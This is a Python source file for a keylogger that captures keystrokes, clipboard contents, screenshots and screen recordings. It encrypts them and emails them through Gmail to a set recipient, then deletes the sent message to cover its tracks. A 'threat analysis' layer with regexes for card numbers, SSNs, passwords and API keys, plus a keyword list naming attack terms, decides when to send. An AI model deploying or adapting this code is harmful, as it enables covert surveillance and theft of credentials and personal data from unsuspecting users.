import smtplib
import threading
import clipboard
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from cryptography.fernet import Fernet
import time
import os
import cv2
import numpy as np
import imaplib
import email
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import re
import requests

# 🔐 API KEYS
VIRUSTOTAL_API_KEY = "Enter your API Key"
ABUSEIPDB_API_KEY = "Enter your API Key"
PERSPECTIVE_API_KEY = "Enter your API Key"

# 🔹 Encryption Key
ENCRYPTION_KEY = b'Enter your Encryption key'
cipher = Fernet(ENCRYPTION_KEY)

# 🔹 Email Credentials
EMAIL_ADDRESS = "sender@gmail.com"
EMAIL_PASSWORD = "Create app password and enter here"
TO_EMAIL = "reciever@gmail.com"

# 🔹 Timings
EMAIL_INTERVAL = 30
RECORDING_DURATION = 20

# 🔎 Threat Patterns
patterns = {
    "ip_address": r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b",
    "ipv6_pattern": r"\b(?:[A-Fa-f0-9]{1,4}:){7}[A-Fa-f0-9]{1,4}\b|\b(?:[A-Fa-f0-9]{1,4}:){1,7}:|\b:(?::[A-Fa-f0-9]{1,4}){1,7}\b|\b(?:[A-Fa-f0-9]{1,4}:){1,6}:[A-Fa-f0-9]{1,4}\b",
    "mac_address": r"\b(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}\b",
    "domain_name": r"\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b",
    "email": r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+",
    "credit_card": r"\b(?:\d[ -]*?){13,16}\b",
    "ssn": r"\b\d{3}-\d{2}-\d{4}\b",
    "url": r"https?://[^\s]+",
    "phone_number": r"\b(?:\+?\d{1,3}[-.\s]?)?(?:\(?\d{3}\)?[-.\s]?)?\d{3}[-.\s]?\d{4}\b",
    "pin": r"\b\d{4}\b",
    "password": r"(?=.*[A-Z])(?=.*[a-z])(?=.*\d)(?=.*[@#$%^&+=*!?])[A-Za-z\d@#$%^&+=*!?]{8,}",
    "api_key": r"\b[A-Za-z0-9_-]{32,45}\b",
    "sql_injection": r"(?i)(union\s+select|select\s+\*\s+from|drop\s+table|insert\s+into)",
    "fernet_key": r"\b[A-Za-z0-9_-]{43}=\b"
}

harmful_keywords = [
    "hack", "exploit", "attack", "keylogger", "malicious", "ransomware", "trojan",
    "backdoor", "ddos", "steal", "bypass", "exfiltrate", "payload", "phishing",
    "rootkit", "spyware", "logger", "remote access", "botnet", "inject", "decrypt",
    "password dump", "credential", "wifi hack", "brute force", "zero day", "CVE",
    "keystroke", "hook", "session hijack", "fake login", "csrf", "xss", "sqlmap",
]



class Keylogger:
    def __init__(self):
        self.log = ""
        self.clipboard_data = ""
        self.is_capslock_on = False
        self.is_shift_pressed = False

    def keypress(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                char = key.char
                if self.is_capslock_on:
                    char = char.upper() if not self.is_shift_pressed else char.lower()
                else:
                    char = char.upper() if self.is_shift_pressed else char.lower()
                self.log += char
            else:
                if hasattr(key, 'vk'):
                    numpad_keys = {
                        96: '0', 97: '1', 98: '2', 99: '3',
                        100: '4', 101: '5', 102: '6',
                        103: '7', 104: '8', 105: '9',
                        110: '.', 111: '/', 106: '*',
                        109: '-', 107: '+'
                    }
                    if key.vk in numpad_keys:
                        self.log += numpad_keys[key.vk]
                        return

                special_keys = {
                    Key.space: " ",
                    Key.enter: "\n",
                    Key.tab: "    ",
                    Key.shift: "",
                    Key.shift_r: "",
                    Key.ctrl_l: "[CTRL]",
                    Key.ctrl_r: "[CTRL]",
                    Key.alt_l: "[ALT]",
                    Key.alt_r: "[ALT]",
                    Key.caps_lock: "[CAPSLOCK]",
                }

                if key == Key.backspace and self.log:
                    self.log = self.log[:-1]
                elif key == Key.caps_lock:
                    self.is_capslock_on = not self.is_capslock_on
                elif key in [Key.shift, Key.shift_r]:
                    self.is_shift_pressed = True
                else:
                    self.log += special_keys.get(key, f"[{str(key).replace('Key.', '').upper()}]")
        except Exception:
            pass

    def keyrelease(self, key):
        if key in [Key.shift, Key.shift_r]:
            self.is_shift_pressed = False

    def monitor_clipboard(self):
        while True:
            try:
                new_data = clipboard.paste()
                if new_data != self.clipboard_data and new_data.strip():
                    self.clipboard_data = new_data
            except Exception:
                pass
            time.sleep(5)

    def encrypt_file(self, file_path):
        with open(file_path, "rb") as file:
            encrypted_data = cipher.encrypt(file.read())
        encrypted_path = file_path + ".enc"
        with open(encrypted_path, "wb") as enc_file:
            enc_file.write(encrypted_data)
        os.remove(file_path)
        return encrypted_path

    def save_keystrokes_to_file(self):
        filename = "keystrokes.txt"
        with open(filename, "w", encoding="utf-8") as file:
            file.write(f"Keystrokes:\n{self.log}\n\nClipboard Data:\n{self.clipboard_data}")
        return self.encrypt_file(filename)

    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            screenshot_path = "screenshot.png"
            screenshot.save(screenshot_path)
            return self.encrypt_file(screenshot_path)
        except Exception:
            return None

    def start_screen_recording(self, duration=RECORDING_DURATION):
        screen = ImageGrab.grab()
        width, height = screen.size
        new_width, new_height = 1280, 720
        if width < new_width or height < new_height:
            new_width, new_height = width, height

        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        video_path = "screen_recording.mp4"
        out = cv2.VideoWriter(video_path, fourcc, 8.0, (new_width, new_height))

        start_time = time.time()
        while time.time() - start_time < duration:
            img = np.array(ImageGrab.grab().resize((new_width, new_height)))
            frame = cv2.cvtColor(img, cv2.COLOR_RGB2BGR)
            out.write(frame)

        out.release()
        return self.encrypt_file(video_path)

    def delete_sent_email(self):
        try:
            mail = imaplib.IMAP4_SSL("imap.gmail.com")
            mail.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            for folder in ['"[Gmail]/Sent Mail"', '"Sent"', '"[Gmail]/Sent"']:
                status, _ = mail.select(folder)
                if status == "OK":
                    result, data = mail.search(None, "ALL")
                    if result == "OK" and data[0]:
                        latest_email_id = data[0].split()[-1]
                        mail.store(latest_email_id, "+FLAGS", "\\Deleted")
                        mail.expunge()
                        print("[✓] Sent email deleted successfully.")
                        break
            mail.logout()
        except:
            pass

    def get_threat_analysis_report(self, text):
        result = ["🔍 Threat Analysis Report:"]
        threat_found = False

        for keyword in harmful_keywords:
            if keyword.lower() in text.lower():
                result.append(f"⚠️ Harmful keyword detected: {keyword}")
                threat_found = True

        for name, pattern in patterns.items():
            matches = re.findall(pattern, text)
            for match in matches:
                result.append(f"⚠️ Pattern detected ({name}): {match}")
                threat_found = True
                if name == "ip_address":
                    result += self.check_abuseipdb(match)
                if name in ["url", "ip_address", "domain_name"]:
                    result += self.check_virustotal(match)

        perspective = self.check_perspective(text)
        if perspective:
            result.append(perspective)
            threat_found = True

        if not threat_found:
            result.append("✅ No threats detected.")
        return "\n".join(result)

    def check_virustotal(self, value):
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        if re.match(patterns["ip_address"], value):
            url = f"https://www.virustotal.com/api/v3/ip_addresses/{value}"
        elif re.match(patterns["domain_name"], value):
            url = f"https://www.virustotal.com/api/v3/domains/{value}"
        elif re.match(patterns["url"], value):
            url = f"https://www.virustotal.com/api/v3/urls/{requests.utils.quote(value)}"
        else:
            return []

        try:
            res = requests.get(url, headers=headers)
            data = res.json()
            malicious = data.get("data", {}).get("attributes", {}).get("last_analysis_stats", {}).get("malicious", 0)
            if malicious > 0:
                return [f"☣️ VirusTotal flagged {value} as malicious!"]
        except:
            pass
        return []

    def check_abuseipdb(self, ip):
        url = f"https://api.abuseipdb.com/api/v2/check"
        headers = {"Key": ABUSEIPDB_API_KEY, "Accept": "application/json"}
        params = {"ipAddress": ip, "maxAgeInDays": 90}
        try:
            res = requests.get(url, headers=headers, params=params)
            data = res.json()
            abuse_score = data.get("data", {}).get("abuseConfidenceScore", 0)
            if abuse_score > 50:
                return [f"🚫 AbuseIPDB flagged IP {ip} with abuse score: {abuse_score}"]
        except:
            pass
        return []

    def check_perspective(self, text):
        url = f"https://commentanalyzer.googleapis.com/v1alpha1/comments:analyze?key={PERSPECTIVE_API_KEY}"
        headers = {"Content-Type": "application/json"}
        payload = {
            "comment": {"text": text},
            "languages": ["en"],
            "requestedAttributes": {
                "TOXICITY": {}, "THREAT": {}, "INSULT": {}
            }
        }
        try:
            response = requests.post(url, headers=headers, data=json.dumps(payload))
            scores = response.json().get("attributeScores", {})
            result = []
            for attr in scores:
                score = scores[attr]["summaryScore"]["value"]
                if score > 0.7:
                    result.append(f"💬 Perspective flagged {attr}: {score:.2f}")
            return "\n".join(result)
        except:
            return ""

    def send_email(self, keystroke_file=None, recording=None, screenshot=None, analysis_log=""):
        try:
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

                msg = MIMEMultipart()
                msg['From'] = EMAIL_ADDRESS
                msg['To'] = TO_EMAIL
                msg['Subject'] = "Encrypted Keylogger Report"

                msg.attach(MIMEText(f"Attached is the encrypted keylogger report.\n\n{analysis_log}", 'plain'))

                for file in [keystroke_file, recording, screenshot]:
                    if file:
                        with open(file, "rb") as attachment:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(attachment.read())
                            encoders.encode_base64(part)
                            part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(file)}")
                            msg.attach(part)

                server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())
                print("[✓] Email sent successfully.")
                self.delete_sent_email()

        except Exception as e:
            print(f"Email error: {e}")

    def report(self):
        text = f"{self.log}\n{self.clipboard_data}"
        analysis_log = self.get_threat_analysis_report(text)
        threat = "⚠️" in analysis_log or "☣️" in analysis_log or "🚫" in analysis_log or "💬" in analysis_log

        if threat:
            print("[!] Threat Detected. Sending email...")

            keystroke_file = self.save_keystrokes_to_file()
            screenshot_path = self.take_screenshot()
            recording_path = self.start_screen_recording(RECORDING_DURATION)

            self.send_email(keystroke_file, recording_path, screenshot_path, analysis_log)
            self.log=""
            self.clipboard_data=""
        else:
            print("[✓] No threat detected. Skipping email.")

        threading.Timer(EMAIL_INTERVAL, self.report).start()


if __name__ == "__main__":
    keylogger = Keylogger()
    listener = Listener(on_press=keylogger.keypress, on_release=keylogger.keyrelease)
    listener.start()
    clipboard_thread = threading.Thread(target=keylogger.monitor_clipboard, daemon=True)
    clipboard_thread.start()
    keylogger.report()
    listener.join()
